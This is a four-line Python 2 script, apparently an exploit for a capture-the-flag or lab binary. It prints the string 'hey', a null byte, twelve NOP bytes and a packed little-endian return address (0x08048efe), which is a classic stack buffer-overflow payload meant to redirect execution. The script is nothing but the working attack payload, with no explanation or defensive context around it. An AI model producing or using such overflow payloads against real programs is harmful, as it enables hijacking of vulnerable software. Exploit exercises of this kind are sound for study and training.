from struct import pack
addr = pack("<I",0x08048efe)

print 'hey'+'\x00'+'\x90'*12+addr
